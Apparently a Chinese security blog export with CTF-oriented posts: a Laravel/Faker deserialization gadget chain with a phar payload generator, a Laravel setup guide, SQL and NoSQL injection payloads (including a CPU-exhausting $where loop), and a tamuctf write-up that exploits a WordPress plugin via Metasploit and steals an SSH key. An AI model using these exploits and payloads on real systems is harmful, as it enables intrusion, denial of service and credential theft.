FactoryContract类是一种的loc容器的合约规定了各种容器的模板，可以看到如下有许多类型很多类似PendingBroadcast的loc实现类继承了FactoryContract的loc合约类（实现类，合约类是我乱讲的估计是没有这个玩意），并且这些实现类中又注册了各种laravel框架的具体实现类， 比如说PendingBroadcast类就是实现了对于事件调用，也就是even的具体实现，而在laravel框架 App\Events 下面的even.php就是通过 Illuminate\Support\Facades 下面的even.php，返回的 123456789class Event extends Facade&#123; ... ... protected static function getFacadeAccessor() &#123; return &apos;events&apos;; &#125;&#125; 1234567891011121314151617181920class Facade&#123;...... $factory = new Factory; $iterator = $factory-&gt;getFileIterator($paths, $suffixes, $prefixes, $exclude); $files = []; foreach ($iterator as $file) &#123; $file = $file-&gt;getRealPath(); if ($file) &#123; $files[] = $file; &#125; &#125;...... 可以看到Event这个类继承了Facade这个类,而Facade这个类又创建了工厂 那么我们可不可以理解为当even被初始化的时候创建了一个工场然后调用工厂中所拥有的BroadcastManager之下的PendingBroadcast类呢？ 以上均是我瞎想的，肯定有错误，不要轻信，这么以一顿思考之后对于Laravel框架有了一定初步认识，不知道其他框架是怎么样子的。 经过前面一番思考，最终可以得出结论PendingBroadcast类肯定是会被调用的，并且很重要，应该不是那么容易被改掉的吧？大概 这里主要是参考hpdoger师傅的博客 http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/ 12345678910111213141516class PendingBroadcast&#123; ... ... public function __construct(Dispatcher $events, $event) &#123; $this-&gt;event = $event; $this-&gt;events = $events; &#125;...... public function __destruct() &#123; $this-&gt;events-&gt;dispatch($this-&gt;event); &#125;&#125; 反序列化的突破口一般是需要需要找到魔法函数destruct|wakeup回到主题PendingBroadcast类中__destruct()方法调用了一个evens类的dispatch方法并且传入了$this-&gt;event。 1234public function __destruct() &#123; $this-&gt;events-&gt;dispatch($this-&gt;event); &#125; 1use Illuminate\Contracts\Events\Dispatcher; 先看下dispatch方法，可以看到PendingBroadcast类调用了一个Dispatcher类，我们往下探寻看下Dispatcher类是干什么的。好吧，其实并不需要看这个类是干什么的。 通过寻找__call 魔法函数我们可以重构Dispatcher类，我们可以找到（不是我找到）ValidGenerator类中__call方法中有一个$res = call_user_func_array(array($this-&gt;generator, $name), $arguments)也就是说我们只要控制了array($this-&gt;generator, $name)我们就可以执行任意方法，同样原理我们只需要构造generator类中不存在的$name方法便可以调用generator类中的__call方法重构这个$name 123456789101112131415161718192021class ValidGenerator&#123; protected $generator; protected $validator; protected $maxRetries;...... public function __call($name, $arguments) &#123; $i = 0; do &#123; $res = call_user_func_array(array($this-&gt;generator, $name), $arguments); $i++; if ($i &gt; $this-&gt;maxRetries) &#123; throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries)); &#125; &#125; while (!call_user_func($this-&gt;validator, $res)); return $res; &#125;&#125; Generator类 这里Generator类中__call方法中$method以及$attributes全部都是可以控制的，分别对应前面的$name以及$arguments或者是对应前前面的dispatch以及event 12345678910class Generator&#123;......... public function __call($method, $attributes) &#123; return $this-&gt;format($method, $attributes); &#125;&#125; 跟进format，可以看到这里将$formatter作为回调函数，$arguments作为参数进行调用 1234public function format($formatter, $arguments = array())&#123; return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);&#125; 继续跟进getFormatter,发现这里只将$formatter传入并且返回$this-&gt;formatters[$formatter]，但是这里$formatter的值是不可控的初值dispatch，这里陷入僵局（说实在话这里假如我自己看，是完全看不出来的），回到我们初始的目的，我们需要将$this-&gt;getFormatter($formatter)构造成一个我们可以控制的函数名来进行利用，我们可以想办法将$this-&gt;getFormatter($formatter)变成数组，于是数组的第一个键名为dispatch，键值任意，第二个键名随意，键值为我们想要控制的函数值（好像不用这么麻烦如果可以构造如dispatch=&gt;xxx，不就好了吗？？？ 123456789 public function getFormatter($formatter) &#123; if (isset($this-&gt;formatters[$formatter])) &#123; return $this-&gt;formatters[$formatter]; &#125;.........&#125; 对没错，回头看了下PHPGGC的payload就是直接构造dispatch=&gt;xxx，可以看到formatters为之前定义的一个变量protected $formatters = array()，这个是可以控制的 123456class Generator&#123; protected $providers = array(); protected $formatters = array();...... 所以我们最终可以构造如下payload，这个是在PHPGGC中的payload，构造出new \Faker\Generator($function)，其中$function是我们想要的函数，$parameter是我们想要的值最终造成return $this-&gt;formatters[$formatter]变成$this-&gt;formatters=dispatch-&gt;$function而call_user_func_array($this-&gt;getFormatter($formatter), $arguments)变成了call_user_func_array($function,$parameter)最终构成RCE执行任意我们想执行的函数。 123456789101112131415161718192021&lt;?phpnamespace GadgetChain\Laravel;class RCE1 extends \PHPGGC\GadgetChain\RCE&#123; public static $version = &apos;5.4.27&apos;; public static $vector = &apos;__destruct&apos;; public static $author = &apos;cf&apos;; public function generate(array $parameters) &#123; $function = $parameters[&apos;function&apos;]; $parameter = $parameters[&apos;parameter&apos;]; return new \Illuminate\Broadcasting\PendingBroadcast( new \Faker\Generator($function), $parameter ); &#125;&#125; 好吧，到这里终于能解释一个PHPGGC的RCE了，以后如果想练习反序列化可以用这个练习，我觉得laravel框架反序列链远远不止PHPGGC的四个RCE，网上找了下就看到不同师傅各种操作。 回到这个题目，我们可以直接用PHPGGC的RCE1构成payload,来吧试试看,我感觉行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace Illuminate\Broadcasting&#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($events, $cmd) &#123; $this-&gt;events = $events; $this-&gt;event = $cmd; &#125; &#125;&#125;namespace Faker&#123; class Generator &#123; protected $formatters; function __construct($function) &#123; $this-&gt;formatters = [&apos;dispatch&apos; =&gt; $function]; &#125; &#125;&#125;namespace&#123; $function = &apos;assert&apos;; $parameters = &apos;phpinfo()&apos;; $o=new \Illuminate\Broadcasting\PendingBroadcast( new \Faker\Generator($function), $parameter ); $filename = &apos;poc.phar&apos;;// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); &quot;); $phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;); $phar-&gt;stopBuffering();&#125;;?&gt; 后记可以说看到怀疑人生…. 参考 https://www.anquanke.com/post/id/170681http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/http://m4p1e.com/web/20181224.htmlhttps://www.anquanke.com/post/id/170681]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>php反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始学习PHP框架之laravel入门]]></title>
    <url>%2F2019%2F03%2F09%2F%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PHP%E6%A1%86%E6%9E%B6%E4%B9%8Blaravel%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[前言现在大多数PHP项目都是基于框架进行开发的，所以学习PHP框架最了解PHP编写web应用程序有着十分重要的作用，也能让我们不仅仅从局部角度去思考一个漏洞为什么产生，而能够让我们以一种全局的眼观看待一个漏洞产生的始末。本文也主要是讲解如何熟练上手PHP框架。 正文一、PHP框架的简要介绍形象的来说，PHP框架 把 PHP 程序开发摆到了流水线上。换句话说，PHP开发框架有助于促进快速软件开发（RAD），这节约了你的时间，有助于创建更为稳定的程序，并减少开发者的重复编写代码的劳动。我们通常认为PHP框架的作用相当于模型-视图-控制器（Model ViewController）。MVC是种编程的架构模式，将业务逻辑从UI中分离出来，允许一个一个单独修改。它隔离了业务逻辑与 UI，允许其一改变而另一者不受影响；在 MVC 中，模型负责数据，视图负责表现，控制器则是程序主体或者说是负责业务逻辑。从本质上说，MVC 拆分了一个程序的开发过程，这样你就可以修改独立的每一部分，而其他部分不受影响。这是十分重要的，它使得编写 PHP 代码更为快捷简单。PHP框架 已经对常见的安全性如表单检测、SQL注入等常见的安全问题做了一定的内置处理。当然，不是用上 PHP 就绝对安全了，最重要的还是要程序开发人员自己有安全意识与经验。 二、php常见框架在Github上搜索PHP在过去几年中，Lavarel有很明显的优势一直处在最热门PHP框架的冠军位置，同样在2019年也是如此，在Github star数甚至是第二名的差不多2.5倍可见它的受欢迎程度。当然常见框架除了laravel还有symfony、CodeIgniter、yii2、cakephp、ZendFramework当然还有国产的THinkPHP，在谷歌走势图中laravel在世界始终是排名第一，并且远远超过其他但是在中国PHP框架使用最多的却是yii这里并不包括thinkphp具体原因很多，主要原因可能是国内还需要科学上网的原因？或者是laravel学习门槛要比ThinkPHP高很多的原因。反正原因很多，在中国还是thinkPHP以及yii2比较流行 三、如何上手一个新的框架如今的PHP框架层出不穷，我该如何才能更快地开始使用某个新的框架呢?最简单的方式就是练习几个简单的demo来熟悉这个框架1、你好世界（hello world）这里练习的必要性我就不多作说明了。在一个新的框架上构建一个应用，在页面中显示“‘hello world”。当然，做起来不会那么简单。 2、计算器（calculator）写一个简单的计算器程序，结合表单，对两个操作数进行加减乘除等运算，并把结果输出到页面上。你需要为每一种运算设置单独的动作，或者说方法（每个框架的叫法不一样），而且还要用到框架中的表单验证功能（如果框架提供了这一功能的话）。 3、留言板（guestbook）让我们回到1998年——建立一个留言本程序，在页面上显示一个表单让用户填写，然后提交到这个应用程序里，继而存储到数据库或文本文件中（视你自己的情况而定），并把用户留言的内容显示到页面上。如果框架提供了创建HTML表单、对象模型或层等功能，就用上它们吧。 4、解析和分页（parse and paginate）选一个RSS源或其他XML源，解析其中的条目并显示出来。同时添加一个分页的功能，让用户可以五条五条地浏览，并在页面的顶部或底部添加页码。如果框架里提供了这样的功能，就使用它吧。 完成以上的练习后，你应该就可以清楚地知道如何使用这个框架了，并能用它完成更复杂的工作，或是继续探索这个框架的其他功能。如果你还是不会用，或者花了很多时间来完成以上练习，那么我觉得这个框架不适合你，还是找些其他的来用吧。 记住，如果在使用框架的过程中遇到困难，记得去该框架的社区里寻求帮助。一个有这强大社区支持的框架会为你未来的工作带来很大帮助，同时也表明这个框架是个不错的框架。没有人希望在使用某框架后的六个月，框架的开发者就宣布停止开发，这就太气人了。 四、laravel毕竟laravel毕竟是全球目前最受欢迎的php框架，我们第二个学习的目标就是它。 关于LaravelLaravel是一个具有表现力，优雅语法的Web应用程序框架。我们相信，发展必须是一种愉快和创造性的体验才能真正实现。Laravel通过简化许多Web项目中使用的常见任务来消除开发中的痛苦，例如： 简单，快速的路由引擎。强大的依赖注入容器。用于会话和缓存存储的多个后端。富有表现力的直观数据库ORM。数据库无关模式迁移。强大的后台工作处理。实时事件广播。Laravel易于访问，功能强大，并提供大型，强大的应用程序所需的工具。 1、Laravel学习地址关于Laravel的学习我们可以在如下网站进行学习 https://laravel.com/docs/5.7https://laracasts.com/series/laravel-from-scratch-2018https://www.kancloud.cn/tonyyu/laravel_5_6/786050 2.Composer安装 https://getcomposer.org/download/ https://learnku.com/docs/lumen/5.7/installation/2402 https://segmentfault.com/a/1190000011858458 https://www.jianshu.com/p/7c745aa026ea 一.安装在中国建议使用如下命令进行安装 12345php -r &quot;copy(&apos;https://install.phpcomposer.com/installer&apos;, &apos;composer-setup.php&apos;);&quot;php composer-setup.phpphp -r &quot;unlink(&apos;composer-setup.php&apos;);&quot; 二.全局安装1sudo mv composer.phar /usr/local/bin/composer 三.更换Composer源Composer国外的源非常不稳定，建议更换成国内的源 方法一.修改 composer 的全局配置文件 1composer config -g repo.packagist composer https://packagist.phpcomposer.com 方法二.修改当前项目的 composer.json 配置文件打开命令行窗口（windows用户）或控制台（Linux、Mac 用户），进入你的项目的根目录（也就是 composer.json 文件所在目录），执行如下命令： 1composer config repo.packagist composer https://packagist.phpcomposer.com 四.Composer安装Laravel(不建议巨麻烦)这种方法巨傻逼，会遇到一堆问题，千万不要尝试,我就是尝试了下，差点疯了。通过Composer安装Laravel有两种方法 注意 ！！！安装的时候一定要满足如下这些条件，不然会出现一堆让你怀疑人生的问题 123456789PHP&gt; = 7.1.3OpenSSL PHP扩展PDO PHP扩展Mbstring PHP扩展Tokenizer PHP扩展XML PHP扩展Ctype PHP扩展JSON PHP扩展BCMath PHP扩展 首先安装依赖 123sudo apt-get install php7.2-xmlsudo apt-get install php-mbstring 1.通过 Laravel 安装器首先，通过使用 Composer 安装 Laravel 安装器： 1composer global require &quot;laravel/installer&quot; 注意：这里需要安装一个PHP插件-zip extension 否则会出现如下错误 12345678910......... Problem 1 - laravel/installer v2.0.1 requires ext-zip * -&gt; the requested PHP extension zip is missing from your system. - laravel/installer v2.0.0 requires ext-zip * -&gt; the requested PHP extension zip is missing from your system. - Installation request for laravel/installer ^2.0 -&gt; satisfiable by laravel/installer[v2.0.0, v2.0.1].......... 安装zip extension插件 12345678# For php v7.0sudo apt-get install php7.0-zip# For php v7.1sudo apt-get install php7.1-zip# For php v7.2sudo apt-get install php7.2-zip 配置PATH环境变量 将 ~/.composer/vendor/bin 添加到 PATH 环境变量中，这样可执行文件 laravel 就能被你的系统检测到了。 编辑 ~/.bash_profile 文件， vim ~/.bash_profile 加入如下代码： 1export PATH=&quot;~/.composer/vendor/bin:$PATH&quot; 或者直接 1export PATH=&quot;~/.composer/vendor/bin:$PATH&quot; 这里要注意使用Laravel5.1以上版本的时候需要使用一下命令 1export PATH=&quot;~/.config/composer/vendor/bin:$PATH&quot; 这时候 装完成后， laravel new 命令会在您指定的目录创建一个全新的 Laravel 项目。例如， laravel new blog 将会创建一个名为 blog 的目录，并已安装好所有的 Laravel 依赖项： 1laravel new blog 为什么 Composer 可以安装 Laravel 框架呢？ 其实 Laravel框架也是一个 Composer包，我们可以通过如下命令查看： 1composer show --all laravel/laravel 123456789......name : laravel/laraveldescrip. : The Laravel Framework.keywords : framework, laravel............ 2.通过 Laravel 安装器 通过 Composer 的 create-project 命令来安装 Laravel 应用： 1composer create-project --prefer-dist laravel/laravel blog 使用这种方法时候可能也会踩如上的坑，如果想使用这种方法请看上面 3.具体实践一下我们拿一个CTF题目进行搭建，题目源码来自代码审计星球。 https://code-breaking.com/puzzle/7/ 下载并将其放入需要安装目录 1Composer install 如果您在本地安装了 PHP，并且您想使用 PHP内置的服务器来为您的应用程序提供服务，可以使用以下命令 1php -S 0.0.0.0:8000 -t html 可以愉快做题了。 3.Homestead安装 https://www.kancloud.cn/tonyyu/laravel_5_6/786195 https://www.jianshu.com/p/aca8305eb392 以CTF题目讲解laravel目录结构具体看这里 https://www.kancloud.cn/tonyyu/laravel_5_6/786088 就以前面lumenserial为例子，实战讲解。 目录结构laravel跟新换代速度非常快，有的时候目录结构变化会很大，所以我们只要理解里面蕴含的思想就可以了 1234567891011121314151617 app 核心目录（框架的核心代码在 /vendor/laravel/framework 里面 bootstrap 框架启动、自动加载配置（目录包含了少许文件，app.php 用于框架的启动和自动载入配置，还有一个 cache 文件夹，里面包含了框架为提升性能所生成的文件，如路由和服务缓存文件 config 所有文件的配置（config 目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉 Laravel 所有默认配置项； database 数据库相关（database 目录包含了数据库迁移文件及填充文件，如果有使用 SQLite 的话，你还可以将其作为 SQLite 数据库存放目录； public 入口文件、项目静态资源文件（public 目录包含了应用入口文件 index.php 和前端资源文件（图片、JavaScript、CSS等），该目录也是 Apache 或 Nginx 等 Web 服务器所指向的应用根目录，这样做的好处是隔离了应用核心文件直接暴露于 Web 根目录之下，如果权限系统没做好或服务器配置有漏洞的话，很可能导致应用敏感文件被黑客窃取，进而对网站安全造成威胁； resources 视图文件（routes 目录包含了应用定义的所有路由。Laravel 默认提供了四个路由文件用于给不同的入口使用：web.php、api.php、 console.php 和 channels.php。web.php 文件包含的路由通过 RouteServiceProvider 引入，都被约束在 web 中间件组中，因而支持 Session、CSRF 保护以及 Cookie 加密功能，如果应用无需提供无状态的、RESTful 风格的 API，那么路由基本上都要定义在 web.php 文件中。api.php 文件包含的路由通过 RouteServiceProvider 引入，都被约束在 api 中间件组中，因而支持频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过 token 进行认证并且不能访问 Session 状态。console.php 文件用于定义所有基于闭包的控制台命令，每个闭包都被绑定到一个控制台命令并且允许与命令行 IO 方法进行交互，尽管这个文件并不定义 HTTP 路由，但是它定义了基于控制台的应用入口（路由）。channels.php 文件用于注册应用支持的所有事件广播频道。 storage 编译后的模板文件、日志文件、缓存文件 tests 单元测试目录 vendor composer加载的依赖文件 参考 https://www.jianshu.com/p/7c745aa026eahttps://pkg.phpcomposer.com/https://blog.csdn.net/will5451/article/details/52474581]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>php框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL与Nosql注入判断以及Nosql注入入门]]></title>
    <url>%2F2019%2F03%2F07%2FSQL%E4%B8%8ENosql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E4%BB%A5%E5%8F%8ANosql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[前言虽然说ctf比赛中主要都是考mysql数据库，但是不可否认同样也有考其他数据库的可能性。 正文简介在当今的互联网企业中，最常用的数据库模型主要分为两种，即关系型数据库和非关系型数据库NoSQL。1.常用关系型数据库Oracle数据库 主要的应用企业包括传统大企业、大公司、政府、金融、证券等 MySQL数据库 MySQL被广泛地应用于各大中小型网站中，具有体积小、速度快、总体拥有成本低，且开放源码等特点。 MariaDB数据库 MariaDB数据库管理系统是MySQL数据库的一个分支，主要由开源社区维护，采用GPL授权许可。 SQL Server数据库SQL Server的功能比较全面、效率高，可以作为中型企业或单位的数据库平台。 Access数据库 PostgreSQL数据库 2.非关系型数据库(nosql)Memcached Memcached是一个开源的、支持高性能、高并发的分布式内存缓存系统，由C语言编写。 redis（key-value） redis是一个高性能的key-value数据库 MongoDB（document-oriented） MongoDB是一个介于关系型数据库和非关系型数据库之间的产品，是非关系型数据库当中功能最丰富，最像关系型数据库的一种产品。 判断数据库一.关系型数据库1.法一 http://www.test.com/search.php?name=zhutougg 假设你已经找到了一个类似如上这样string型注入，我们可以通过利用 +、||、 等，构造如下payload（虽然我觉得这个方法没什么作用） http://www.test.com/search.php?name=zhutou&#39;+&#39;gg 以mysql为例子只有，select &#39;some&#39; &#39;thing&#39;或者 select concat(&#39;some&#39;,&#39;thing&#39;) 才会得到数据，若使用其他数据库的脚本就会返回空。mysql数据库使用 mysql脚本select &#39;some&#39; &#39;thing&#39; mysql数据库使用oracle脚本select &#39;some&#39;||&#39;thing&#39; 其它同理。 2.法二 可以利用数据库的一些特有的返回整型结果的函数来判断数据库 12345678SQLServer @@pack_received @@rowcountMySQL connection_id() last_insert_id() row_count()Oracle BITAND(1,1)PostgreSQL select extract(dow from now()) 同样是MySQL数据库 使用 select connection_id()使用 select extract(dow from now()) 法三、通过某些特有的函数判断，比如SQLServer的 waitfor delay 比如PostgreSQL的pg_sleep() 基于时间的 在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。 在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型 在mysql之中，可以使用sleep(5)注入参数之中，造成延迟来判断数据库类型 法四： Access: and (select count(*) from MSysAccessObjects)&gt;0and exists(select count(*) from 表) 返回正常说明是accessID=1 and (select count(*) from sysobjects)&gt;0返回异常 ID=1 and(select count(*) fromm sysobjects)&gt;0返回异常 * SQLserver: and (select count(*) from sysobjects) &gt;0 返回正常说明是mssqlsqlserver：http://www.wenkuxiazai.com/showdetail.asp?id=49 and user&gt;0 MySQL: and length(user())&gt;0 id=2 CHAR(97,110,100,32,49,61,49) id=2 and version() &gt;0 返回正常说明是MySQL ORACLE：ID=1 and &#39;1&#39; || &#39;1&#39; = &#39;11 ID=1 and 0 &lt;&gt; (select count(*) from dual) ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49) 返回正常说明是ORACLE MSSQL：ID=1 and (select count(*) from sysobjects)&gt;0返回正常ID=1 and (select count(*) fromm sysobjects)&gt;0返回异常ID=1 and left(version(),1)=5%23//红色字体也可能是4ID=1 and exists(select id from sysobjects)ID=1 and length(user)&gt;0ID=1 CHAR(97) +CHAR(110) +CHAR(100) +CHAR(32) +CHAR(49) +CHAR(61) +CHAR(49) 法五：其实我们还可以利用数据库的注释符来判断 二、非关系型数据库如何识别数据库使用的是nosql数据库呢？法一：使用nosqlmap或者nosqlattack等自动化工具法二：直接使用针对于nosql的常见注入脚本法三：根据情况判断。比如网站有信息泄露之类的。 NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。使用比较多的Nosql数据库为MongoDB，Nosql在查询的时候采用BSON类型数据，有别于传统的json数据我们先讲解下什么是Bson数据 那BSON是个啥？BSON Spec官方是这样描述的：BSON（Binary Serialized Document Format）, short for Bin­ary JSON, is a bin­ary-en­coded seri­al­iz­a­tion of JSON-like doc­u­ments. 举个栗子：json数据 { “key”: “value” } 将它转换成BSON数据： 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+|14 00 00 00|02|6b 65 79 00|06 00 00 00 76 61 6c|+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+|75 65 00|00|+–+–+–+–+ 大概就是json的摘要，类似于将json二进制数据进行序列化感兴趣的可以看 http://liehu.tass.com.cn/archives/1294 其实这么一看好像nosql安全性挺高的，然而却不是这样，为了保持高速的访问，nosql有着许多安全问题。 主要问题有Nosql未授权访问。PHP:1.以查询条件{ “password”: @USER_INPUT }为例，在不知道密码的情况下，可以使用{ “password”: { “$ne”: 1 } }绕过。 2.永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制，主要造成这个原因是由于MongoDB之类的nosql数据库对用户输入没有做任何校验，感兴趣可以看 https://www.anquanke.com/post/id/97211 以登入界面为例子，直接使用以下payload便可以直接登入。payload:username[$ne]=1&amp;password[$ne]=1 感觉这个和未授权访问貌似讲的是同会事3.NoSQL联合查询注入 string query =”{ username: ‘“ + post_username + “‘, password: ‘“ + post_password + “‘ }” payload: username=tolkien’, $or: [ {}, { ‘a’:’a&amp;password=’ } ] JavaScript:在MongoDB中 $where操作符是可以执行JavaScript语句的payload username=1&amp;password=1;return true; username=1&amp;password=1;(function(){var%20date%20=%20new%20Date();%20do{curDate%20=%20new%20Date();}while(curDate-date%3C5000);%20return%20Math.max();})(); 这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒。5.Node.js中的NoSQL注入payload 1&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125; 其实就是把它数据变成json。靶场 https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035 wp https://www.anquanke.com/post/id/95844 参考 https://www.jianshu.com/p/80d7e16c0185https://db-engines.com/en/rankinghttps://www.jianshu.com/p/995f57e36918https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/https://www.jianshu.com/p/995f57e36918https://www.bugbank.cn/q/article/59899f4b9a4253dc14efe543.htmlhttps://xz.aliyun.com/t/2075https://www.anquanke.com/post/id/97211http://liehu.tass.com.cn/archives/1294]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从tamuctf Network中学习内网渗透]]></title>
    <url>%2F2019%2F03%2F06%2Ftamuctf%20Network%E9%83%A8%E5%88%86wp%2F</url>
    <content type="text"><![CDATA[前言这个是tamuctf内网穿透的题目,话说tamuctf居然是一个校赛… 正文环境环境搭建 apt install openvpn openvpn –config ${challenge}.ovpn这里的${challenge}是指具体文件名字 Stop and Listen123456789101112131415161718192021222324252627Sometimes you just need to stop and listen.This challenge is an introduction to our network exploit challenges, which are hosted over OpenVPN.Instructions:Install OpenVPN. Make sure to install the TAP driver.Debian (Ubuntu/Kali) linux CLI: apt install openvpnWindows GUI installerObtain your OpenVPN configuration in the challenge modal.You will obtain a separate config for each challenge containing connection info and certificates for authentication.Launch OpenVPN:CLI: sudo openvpn --config $&#123;challenge&#125;.ovpnWindows GUI: Place the config file in %HOMEPATH%\OpenVPN\config and right-click the VPN icon on the status bar, then select the config for this challengeThe virtual tap0 interface will be assigned the IP address 172.30.0.14/28 by default. If multiple team members connect you will need to choose a unique IP for both.The standard subnet is 172.30.0.0/28, so give that a scan ;)If you have any issues, please let me (nategraf) know in the Discord chatSome tools to get started:Wiresharktcpdumpnmapettercapbetterca The standard subnet is 172.30.0.0/28, so give that a scan ;根据题目提示我们首先 nmap -vvv 172.30.0.0/28 并没有发现什么可疑的端口根据题目提示使用wireshark进行流量分析，先在服务器进行流量抓取 tcpdump -i tap0 -w listen.pcay 耐心等会 Wordpress1234567I setup my own Wordpress site!I love that there are so many plugins. My favorite is Revolution Slider. Even though it&apos;s a little old it doesn&apos;t show up on wpscan!Please give it about 30 seconds after connecting for everything to setup correctly.The flag is in /root/flag.txtDifficulty: medium 根据题目提示应该是wordpress的某个插件出现问题 My favorite is Revolution Slider， Even though it’s a little old it doesn’t show up on wpscan wpscan是wordpress的专门扫描器，题目虽然说用wpscan扫不出但是，估计就是这个Revolution Slider有问题了。 并且flag 在 /root/flag.txt中我们再次 openvpn –config wordpress.ovpn 依旧nmap 一波 nmap -vvv 172.30.0.0/28 123456789101112Nmap scan report for 172.30.0.2......3306/tcp open mysql syn-ack ttl 64MAC Address: 02:42:3D:35:F3:46 (Unknown)Nmap scan report for 172.30.0.3......22/tcp open ssh syn-ack ttl 6480/tcp open http syn-ack ttl 64MAC Address: 02:42:2E:E8:F8:89 (Unknown) 可以知道172.30.0.3的80端口有开，我们使用wpscan扫描 1docker run -it --rm wpscanteam/wpscan --url 172.30.0.3 --enumerate 1234567891011121314151617181920212223242526[+] revslider | Location: http://172.30.0.3/wp-content/plugins/revslider/ | | Detected By: Urls In Homepage (Passive Detection) | | [!] 2 vulnerabilities identified: | | [!] Title: WordPress Slider Revolution Local File Disclosure | Fixed in: 4.1.5 | References: | - https://wpvulndb.com/vulnerabilities/7540 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579 | - https://www.exploit-db.com/exploits/34511/ | - https://www.exploit-db.com/exploits/36039/ | - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html | - http://packetstormsecurity.com/files/129761/ | | [!] Title: WordPress Slider Revolution Shell Upload | Fixed in: 3.0.96 | References: | - https://wpvulndb.com/vulnerabilities/7954 | - https://www.exploit-db.com/exploits/35385/ | - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/ | - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute | | The version could not be determined. 有两个攻击点，先看看第一个 https://www.exploit-db.com/exploits/34511 漏洞是这么形容的 Mulitple WordPress Themes - ‘admin-ajax.php?img’ Arbitrary File Download 意思为这个漏洞为任意文件下载漏洞，给出了POP链 POC 1http://victim/wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php 我们试试能不能读取文件。尝试了下不可以，因该是权限不足的原因。 试试第二个，使用msf 其实并不用这么麻烦的，这里只是介绍下wpscan其实一开始就给我们说了 12345678msf5 &gt; search wp_revslider_upload_executeMatching Modules================ Name Disclosure Date Rank Check Description ---- --------------- ---- ----- ----------- exploit/unix/webapp/wp_revslider_upload_execute 2014-11-26 excellent Yes WordPress RevSlider File Upload and Execute Vulnerability 所以msf直接search Revolution就可以了 12345678msf5 &gt; search RevolutionMatching Modules================ Name Disclosure Date Rank Check Description ---- --------------- ---- ----- ----------- exploit/unix/webapp/wp_revslider_upload_execute 2014-11-26 excellent Yes WordPress RevSlider File Upload and Execute Vulnerability 其实是达到了相同的效果 123456789msf5 &gt; use unix/webapp/wp_revslider_upload_executemsf5 exploit(unix/webapp/wp_revslider_upload_execute) &gt; set RHOSTS 172.30.0.3RHOSTS =&gt; 172.30.0.3msf5 exploit(unix/webapp/wp_revslider_upload_execute) &gt; exploit......meterpreter &gt; 1meterpreter &gt; shell 我们成功得到一个shell 读取下flag发现权限不足 ls下发现目录里note.txt很可疑cat 以下 发现意思是要我们去数据库中获取ssh密钥 我们再看下当前目录，尝试下cat wp-config.php 然后发现数据库信息 1234567define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);/** MySQL database username */define(&apos;DB_USER&apos;, &apos;wordpress&apos;);/** MySQL database password */define(&apos;DB_PASSWORD&apos;, &apos;0NYa6PBH52y86C&apos;); 1mysql -h 172.30.0.2 -u wordpress --password=&quot;0NYa6PBH52y86C&quot; 123456select load_file(&apos;/backup/id_rsa&apos;);[...]-----BEGIN RSA PRIVATE KEY-----......-----END RSA PRIVATE KEY----- 创建一个rsa.key文件，并给他一定权限 12root@iZwz9hyvb5rjm3oubt8o15Z:~# touch rsa.keyroot@iZwz9hyvb5rjm3oubt8o15Z:~# vim rsa.key 123456789root@iZwz9hyvb5rjm3oubt8o15Z:~# chmod 400 rsa.key root@iZwz9hyvb5rjm3oubt8o15Z:~# ssh -i rsa.key root@172.30.0.3Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-141-generic x86_64)......root@apacheword:~# $ chmod 400 rsa.key$ ssh -i rsa.key root@172.30.0.3 成功获取到一个root权限 12345root@apacheword:~# root@apacheword:~# lsflag.txtroot@apacheword:~# cat flag.txt 